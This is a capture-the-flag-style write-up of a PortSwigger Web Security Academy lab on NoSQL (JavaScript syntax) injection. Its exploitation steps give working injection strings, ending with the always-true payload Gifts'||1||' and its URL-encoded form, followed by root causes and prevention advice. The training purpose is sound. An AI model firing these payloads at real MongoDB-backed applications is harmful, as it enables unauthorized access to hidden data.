# Lab 01: Detecting NoSQL Injection-- SOLVED ✅
# Lab 01: Detecting NoSQL Injection — SOLVED ✅

**Platform:** PortSwigger Web Security Academy  
**Category:** NoSQL Injection  
**Level:** Apprentice  
**Tool:** Burp Suite Community Edition (Repeater)  
**Status:** Solved ✅

---

## Objective

The product category filter is powered by MongoDB. Perform a NoSQL injection attack that causes the application to display unreleased products.

## Vulnerability Type

**JavaScript / Syntax Injection** (Not Operator Injection)

The `category` parameter is concatenated directly into a server-side JavaScript query without sanitization or type validation.

## Detection

Intercepted the request in Burp:

GET/filter?category=Gifts HTTP/1.1

Tested with a single quote:
GET/filter?category=' HTTP/1.1

**Result:** `500 Internal Server Error` + JavaScript syntax error. Injection confirmed.

## Exploitation

**Step 1 - Validate:** `Gifts'+'` -> `200 OK`

**Step 2 - FALSE:** `Gifts' && 0 && 'x` -> 0 products

**Step 3 - TRUE:** `Gifts' && 1 && 'x` -> Gifts products returned

**Step 4 - Final Payload - Always True:**

Gifts'||1||'

Encoded: Gifts%27%20%7C%7C%201%20%7C%7C%20%27

This bypasses the category filter and the `released = true` check. Unreleased products displayed.

## Root Cause

1. User input concatenated into NoSQL / JavaScript query
2. No input type validation
3. No parameterized query
4. Server-side JavaScript execution enabled

## Fix / Prevention

- Validate input type: expect string, reject objects/operators
- Use parameterized / structured queries, never string concatenation
- Disable server-side JS execution (`$where`) if not needed
- Apply least-privilege DB user

## Key Learning

> NoSQL does NOT mean No Injection.
> This lab was JavaScript Syntax Injection using `'` + `||` + `&&`.
> Operator Injection (`$ne`, `$gt`) is Lab 02.

## Next Lab

**Lab 02:** Exploiting NoSQL Operator Injection to Bypass Authentication

---
**Author:** Issahaku Zuruka/Cyber Zulka

